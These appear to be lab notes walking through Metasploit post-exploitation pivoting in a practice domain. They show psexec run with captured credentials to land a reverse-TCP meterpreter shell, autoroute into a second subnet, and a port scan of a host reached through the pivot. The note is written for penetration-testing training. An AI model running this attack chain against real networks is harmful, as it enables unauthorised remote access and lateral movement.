1. **Getting a meterpreter session on windows 10 1 machine using metasploit**
```python
msf6 > use windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.16
RHOSTS => 192.168.1.16
msf6 exploit(windows/smb/psexec) > set SMBDOMAIN marvel.local
SMBDOMAIN => marvel.local
msf6 exploit(windows/smb/psexec) > set SMBPASS Password1
SMBPASS => Password1
msf6 exploit(windows/smb/psexec) > set SMBUSER fcastle
SMBUSER => fcastle
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set target 2
target => 2
msf6 exploit(windows/smb/psexec) > run
```

![[post_ex_pivot1.png]]

2. Analyzing the route of windows 1 machine and try to identify if there is any machine connected to it but in different network.
![[post_ex_pivot2.png]]

**Using ipconfig** - 
![[post_ex_pivot3.png]]

3. Now, we are going to set up routing through a compromised host when you have already obtained a Meterpreter shell on a target machine within the 10.10.10.0/24 network.
```python
meterpreter > run autoroute -s 10.10.10.0/24
```

4. displaying the current routing table configuration within the Meterpreter shell. It potentially allowing you to access other systems or networks within the specified subnets.
![[post_ex_pivot4.png]]

5. Doing a portscan on the another machine.
```python
msf6 exploit(windows/smb/psexec) > search portscan
msf6 exploit(windows/smb/psexec) > use 5
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.10.10.5
RHOSTS => 10.10.10.5
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445
PORTS => 445
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 10.10.10.5:           - 10.10.10.5:445 - TCP OPEN
[*] 10.10.10.5:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
